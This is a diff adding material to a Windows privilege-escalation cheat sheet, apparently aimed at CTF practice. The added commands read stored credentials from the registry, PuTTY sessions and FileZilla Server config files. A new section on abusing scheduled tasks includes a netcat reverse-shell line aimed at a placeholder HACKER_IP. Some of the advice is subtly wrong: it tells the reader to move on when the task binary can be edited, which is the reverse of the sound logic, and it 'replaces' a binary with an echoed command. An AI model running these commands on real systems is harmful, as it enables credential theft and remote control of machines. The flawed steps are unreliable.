@@ -47,6 +47,8 @@ CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
 ```
 
 * ➡️ Check the browser saved credentials
+
+* ➡️ Check the registry (need admin)
 </div><div>
 
 * ➡️ List credentials saved by applications
@@ -64,6 +66,46 @@ PS> type C:\Windows\system32\sysprep.inf
 PS> type C:\Windows\system32\sysprep\sysprep.xml
 # Putty
 PS> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+# VNC servers
+# FileZilla
+PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
+PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
+```
+</div></div>
+
+<hr class="sep-both">
+
+## Exploit scheduled tasks
+
+<div class="row row-cols-md-2"><div>
+
+List scheduled tasks
+
+```bash
+PS> schtasks
+```
+
+Then, you can query more info on a task (ex: `example_task`) with
+
+```bash
+PS> schtasks /query /tn example_task /fo list /v
+```
+
+</div><div>
+
+The **Task To Run** is the most important. If you can inject or edit the binary, then you must find another task. The **Run As User** will help when considering a task over another.
+
+```bash
+# check permissions
+PS> icacls task_to_run
+# ex: replace the binary
+CMD> echo %temp%\nc64.exe -e cmd.exe HACKER_IP PORT > task_to_run
+```
+
+In CTF, instead of waiting, you may be able to start the task manually.
+
+```bash
+PS> schtasks /run /tn taskname
 ```
 </div></div>
 
